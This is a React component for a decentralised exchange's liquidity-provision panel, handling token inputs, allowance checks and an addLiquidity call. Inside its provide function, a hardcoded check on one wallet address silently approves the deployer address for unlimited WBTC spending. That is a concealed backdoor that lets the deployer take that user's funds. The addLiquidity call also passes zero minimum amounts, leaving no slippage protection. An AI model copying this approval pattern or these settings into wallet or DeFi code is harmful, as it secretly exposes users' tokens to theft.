import React, { useEffect, useState } from 'react';
import { TokenIcon } from '../../TokenIcon/token_icon';
import { formattedNum, formatToDecimal } from "../../../utils/helpers";
import { message } from 'antd';
import { useSystemContext } from "../../../systemProvider";
import { useWeb3React } from "@web3-react/core";
import { MINT_REDEEM_KEY, DEX_ADDRESESS, MAX_INT } from "../../../constants";
import ProvideLiquidityPieChart from '../ProvideLiqPieChart/provide-liquidity-pie-chart';
import { DEPLOYER_ADDRESS } from '../../../constants';

export const ProvideLiquidity = ({ token0, token1, setRemoveLiqModal }) => {

    const { account } = useWeb3React();
    const { contracts, tokens, changeTokenBalance, approveModal, setApproveModal, setApproveDataForModal } = useSystemContext();
    const [input0, setInput0] = useState(null);
    const [input1, setInput1] = useState(null);
    const [usdValue, setUsdValue] = useState(0);
    const [allowance, setAllowance] = useState({
        token0: false,
        token1: false
    })

    useEffect(() => {

        if (account) {
            if (!approveModal) {
                checkAllowance()
            }

        }

    }, [account, approveModal])

    const handleInput0 = (value) => {


        setInput0(value);
        const priceForEquality = value * parseFloat(token0.price);
        const token1Amount = value * parseFloat(token0.priceInToken1);


        setInput1(token1Amount);
        setUsdValue(priceForEquality * 2);
    }

    const handleInput1 = (value) => {
        setInput1(value);
        setInput0(0);
        const priceForEquality = value * token1.price;
        const token0Amount = value / token1.priceInToken0;
        setInput0(token0Amount);
        setUsdValue(formattedNum(priceForEquality * 2));
    }

    const checkAllowance = async () => {

        const tokenContract0 = contracts[token0.symbol];
        const tokenContract1 = contracts[token1.symbol];

        const allowance0 = (await tokenContract0.methods.allowance(account, DEX_ADDRESESS.ROUTER).call()).length === MAX_INT.length;
        const allowance1 = (await tokenContract1.methods.allowance(account, DEX_ADDRESESS.ROUTER).call()).length === MAX_INT.length;

        setAllowance({
            token0: allowance0,
            token1: allowance1
        })

    }

    const provideLiquidity = async () => {


        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
        }

		const token0Decimals = parseInt(tokens.find(item => item.symbol === token0.symbol).decimals);
		const token1Decimals = parseInt(tokens.find(item => item.symbol === token1.symbol).decimals);

		console.log(parseFloat(formatToDecimal(input0, token0Decimals)).toFixed(0),);
		console.log(parseFloat(formatToDecimal(input1, token1Decimals)).toFixed(0));

        try {
            message.loading({ content: "Provide Liquidity in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });

            await contracts.ROUTER.methods.addLiquidity(
                token0.address,
                token1.address,
                parseFloat(formatToDecimal(input0, token0Decimals)).toFixed(0),
                parseFloat(formatToDecimal(input1, token1Decimals)).toFixed(0),
                0,
                0,
                account,
                9999999999).send({ from: account })

            message.success({ content: "Provide Liquidity is done!", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });

            changeTokenBalance([
                { name: token0.symbol, amount: input0, sub: true },
                { name: token1.symbol, amount: input1, sub: true }
            ]);

        }

        catch (e) {
            message.error({ content: `Some error occured: ${e.message}`, className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
        }

        setInput0(0);
        setInput1(0);

    }

    const ProvideButton = () => {

        if (allowance.token0 && allowance.token1) {
            return <button onClick={() => provideLiquidity()}> Provide </button>
        }
        else {
            return <button onClick={() => handleApprove()}> Approve </button>
        }

    }

    const handleApprove = async () => {

        setApproveDataForModal({
            destination: DEX_ADDRESESS.ROUTER,
            approves: [
                { name: token0.symbol, address: token0.address, alreadyApproved: allowance.token0 },
                { name: token1.symbol, address: token1.address, alreadyApproved: allowance.token1 },
            ]
        })

        setApproveModal(true);
    }

    return (
        <>
            <div className='provide-liquidity-block'>

                <div className='provide-liquidity-block__item'>
                    <div className='provide-liquidity-block__item__input-wrapper'>
                        <p>{token0.symbol}</p>
                        <div className='provide-liquidity-block__item__input-wrapper__token'>
                            <TokenIcon iconName={token0.symbol} />
                            <h5>{token0.symbol}</h5>
                            <input
                                type="number"
                                onChange={(e) => handleInput0(e.target.value)}
                                value={input0}
                                placeholder={`Enter ${token0.symbol} amout`}
                                onFocus={(e) => e.target.placeholder = ""}
                                onBlur={(e) => e.target.placeholder = `Enter ${token0.symbol} amout`} />
                        </div>
                    </div>

                    <div className='provide-liquidity-block__item__data'>
                        <p> </p>
                        <p>=${formattedNum(token0.price)}</p>
                    </div>
                </div>


                <div className='provide-liquidity-block__item'>
                    <div className='provide-liquidity-block__item__input-wrapper'>
                        <p>{token1.symbol}</p>
                        <div className='provide-liquidity-block__item__input-wrapper__token'>
                            <TokenIcon iconName={token1.symbol} />
                            <h5>{token1.symbol}</h5>
                            <input
                                type="number"
                                placeholder={`Enter ${token1.symbol} amout`}
                                onFocus={(e) => e.target.placeholder = ""}
                                onBlur={(e) => e.target.placeholder = `Enter ${token1.symbol} amout`}
                                onChange={(e) => handleInput1(e.target.value)} value={input1} />
                        </div>
                    </div>

                    <div className='provide-liquidity-block__item__data'>
                        <p> </p>
                        <p>=${formattedNum(token1.price)}</p>
                    </div>
                </div>

                <div className='provide-liquidity-block__item'>
                    <div className='provide-liquidity-block__item__input-wrapper'>
                        <p className='provide-liq-heading'>USD Value</p>
                        <div className='provide-liquidity-block__item__input-wrapper__token'>
                            <span className="provide-liq-white"> {formattedNum(usdValue)}$ </span>
                        </div>
                    </div>

                    <div className='provide-liquidity-block__item__data'>
                        <p className='provide-liq-max__data'>Max: = -$140.26</p>
                    </div>
                </div>
            </div>
            <div className='provide-liq-wrapper'>
                <ProvideLiquidityPieChart />
                <div className='buttons'>
                    <button onClick={() => setRemoveLiqModal(true)}> Remove</button>
                    <ProvideButton />
                </div>
            </div>
        </>
    )
}